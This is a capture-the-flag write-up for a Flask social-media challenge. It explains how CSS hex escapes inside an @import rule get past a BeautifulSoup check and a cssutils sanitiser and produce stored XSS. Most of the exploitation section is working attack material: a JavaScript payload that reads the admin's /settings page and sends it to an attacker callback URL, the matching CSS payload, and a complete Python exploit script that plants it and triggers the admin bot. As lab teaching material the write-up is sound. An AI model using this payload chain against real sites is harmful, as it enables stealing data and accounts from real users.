# y — Web Writeup

**Author:** Luma  
**Category:** Web  
**URL:** `http://TARGET:PORT`

## Overview

A Flask social-media platform where each user can customise their profile with CSS. An admin bot (Selenium/Chrome headless) visits any URL we submit via a "Report Suspicious Link" form. The admin's **username is the flag**, visible on the `/settings` page. The goal is to achieve stored XSS on the admin's profile and use it to exfiltrate the flag.

## Reconnaissance

### Application structure

| Route | Purpose |
|---|---|
| `/register`, `/login` | Account management |
| `/feed` | View all posts; submit a link for admin review |
| `/profile/<id>` | View a user's profile — renders user's custom CSS |
| `/settings` | View own username (flag for admin) and edit CSS |
| `/settings/css` | `POST` — update profile CSS |
| `/report` | `POST` — admin bot logs in and visits the submitted URL |

### Key observations

1. **Admin's username is the flag.** In `app.py`, the admin account is created with `username = ADMIN_FLAG` (the flag), and the `/settings` template displays it: `{{ user.username }}`.

2. **Admin bot logs in with the flag as username.** The `/report` handler calls `run_report(link, ADMIN_FLAG, 'admin123')`, which makes the bot log in using the flag as the username and then visit the reported URL.

3. **Profile CSS is rendered unsanitised into a `<style>` tag.** In the `/profile/<id>` route:
   ```python
   css = "<style>" + user['profile_css'] + "</style>" if user['profile_css'] else ""
   return render_template('profile.html', ..., profile_css=css)
   ```
   And in `profile.html`:
   ```html
   {{ profile_css | safe }}
   ```
   The `| safe` filter tells Jinja2 to skip HTML-escaping, trusting the server-side sanitisation.

4. **CSS sanitisation only filters `CSSStyleRule`** — `@import` rules pass through unchecked.

5. **BeautifulSoup + `html.parser` doesn't understand CSS escape sequences.**

## Vulnerability Analysis

### Bug 1: `sanitize_css()` ignores `@import` rules

In `css.py`, the sanitiser uses `cssutils` and only inspects `CSSStyleRule` objects:

```python
for rule in list(sheet):
    if isinstance(rule, cssutils.css.CSSStyleRule):
        # only style rules are checked
        for prop in list(rule.style):
            if prop.name not in ALLOWED_PROPERTIES:
                rule.style.removeProperty(prop.name)
```

An `@import` rule produces a `CSSImportRule`, which is **not** `CSSStyleRule`, so the loop body never executes for it. Any `@import` rule survives sanitisation verbatim.

### Bug 2: cssutils decodes CSS hex escapes during serialization

CSS allows hex escape sequences like `\3c` (which decodes to `<`) and `\3e` (which decodes to `>`). When `cssutils` serializes the parsed CSS back to a string, it **decodes** these escapes into their literal characters.

So the input:
```css
@import url("\3c /style\3e \3c script\3e alert(1)\3c /script\3e \3c style\3e ");
```

Gets serialized by `cssutils` as:
```css
@import url("</style><script>alert(1)</script><style>");
```

### Bug 3: BeautifulSoup `html.parser` doesn't parse CSS escapes

Before `sanitize_css()` runs, the app wraps the input in `<style>` tags and checks it with BeautifulSoup:

```python
in_style = "<style>" + request.form.get('profile_css', '') + "</style>"
soup = BeautifulSoup(in_style, 'html.parser')
if len(soup.contents) != 1 or soup.contents[0].name != 'style':
    flash('Invalid CSS input')
    return redirect(url_for('settings'))
```

This check ensures the raw input doesn't contain HTML tags that would break out of `<style>`. However, CSS hex escapes like `\3c` are **not** recognised as HTML by `html.parser` — it sees them as harmless text inside the style block. The check passes.

### Full chain: CSS hex escapes → Stored XSS

1. Attacker submits CSS with `@import url("\3c /style\3e \3c script\3e JS_PAYLOAD\3c /script\3e \3c style\3e ");`
2. **BeautifulSoup check passes** — `\3c` is not `<` from the HTML parser's perspective.
3. **`sanitize_css()` preserves the `@import`** — it's not a `CSSStyleRule`.
4. **`cssutils` decodes the escapes** — the stored CSS now contains literal `</style><script>...</script><style>`.
5. When the profile is rendered, this breaks out of the `<style>` tag and injects a `<script>` — **stored XSS**.

## Exploitation

### Strategy

1. Register a new user.
2. Set the user's profile CSS to the XSS payload via `POST /settings/css`.
3. The injected JavaScript will: fetch `/settings` (same-origin), extract the admin username (flag) from the response, and exfiltrate it to an attacker-controlled server.
4. Report the attacker's profile URL (`/profile/<uid>`) to the admin bot.
5. The admin bot visits the profile, the XSS fires in the admin's browser, and the flag is sent to our callback.

### JavaScript payload

The XSS fetches the `/settings` page (which displays the logged-in user's username) and sends it to an external callback URL:

```javascript
fetch('/settings').then(r=>r.text()).then(t=>{
  var x=t.split('Username:')[1].split('</p>')[0];
  new Image().src='https://CALLBACK/?f='+encodeURIComponent(x)
})
```

### CSS payload

The JS is embedded within CSS hex escapes inside an `@import` rule:

```css
@import url("\3c /style\3e \3c script\3e fetch('/settings').then(r=>r.text()).then(t=>{var x=t.split('Username:')[1].split('</p>')[0];new Image().src='https://CALLBACK/?f='+encodeURIComponent(x)})\3c /script\3e \3c style\3e ");
```

After `cssutils` serialization, this becomes:

```html
@import url("</style><script>fetch('/settings')...)</script><style>");
```

Which, when rendered in `profile.html`, produces:

```html
<style>@import url("</style>
<script>fetch('/settings')...exfil...)</script>
<style>");</style>
```

The browser sees the first `</style>` and closes the style block, then executes the `<script>` tag.

## Exploit

```python
#!/usr/bin/env python3
import requests
import time

TARGET   = "http://TARGET:PORT"
CALLBACK = "https://YOUR_CALLBACK_URL"
BOT_BASE = "http://localhost:5000"

sess = requests.Session()
USERNAME = f"xss_{int(time.time())}"
PASSWORD = "exploit123"
DISPLAY  = "XSSTest"


def register_and_login():
    sess.post(f"{TARGET}/register", data={
        'username': USERNAME, 'display_name': DISPLAY, 'password': PASSWORD,
    }, timeout=15)
    r = sess.post(f"{TARGET}/login", data={
        'username': USERNAME, 'password': PASSWORD,
    }, allow_redirects=True, timeout=15)
    return 'Feed' in r.text or '/feed' in r.url


def find_our_uid():
    for uid in range(1, 50):
        r = sess.get(f"{TARGET}/profile/{uid}", timeout=8)
        if r.status_code == 200 and DISPLAY in r.text:
            return uid
    return -1


def set_xss_css():
    js = (
        "fetch('/settings').then(r=>r.text()).then(t=>{"
        "var x=t.split('Username:')[1].split('</p>')[0];"
        "new Image().src='" + CALLBACK + "/?f='+encodeURIComponent(x)"
        "})"
    )
    css_payload = (
        '@import url("\\3c /style\\3e \\3c script\\3e '
        + js +
        '\\3c /script\\3e \\3c style\\3e ");'
    )
    r = sess.post(f"{TARGET}/settings/css",
                  data={'profile_css': css_payload},
                  allow_redirects=True, timeout=15)
    return r.status_code == 200


def report_profile(uid):
    url = f"{BOT_BASE}/profile/{uid}"
    r = sess.post(f"{TARGET}/report",
                  data={'link': url},
                  allow_redirects=True, timeout=15)
    return r.status_code == 200


def main():
    assert register_and_login(), "Login failed"
    uid = find_our_uid()
    assert uid > 0, "Could not find our user_id"
    assert set_xss_css(), "CSS update failed"
    assert report_profile(uid), "Report failed"
    print(f"[+] Done! Check {CALLBACK} for ?f= parameter containing the flag")


if __name__ == '__main__':
    main()
```

### Steps to reproduce

1. Set up a public callback URL (e.g., Pipedream, webhook.site, or ngrok).
2. Edit `TARGET` and `CALLBACK` in the exploit script.
3. Run: `python3 exploit_final.py`
4. The flag arrives at the callback as the `?f=` query parameter:
   ```
   GET /?f=%20ROCSC{...} HTTP/1.1
   ```

## Flag

```
ROCSC{...}
```
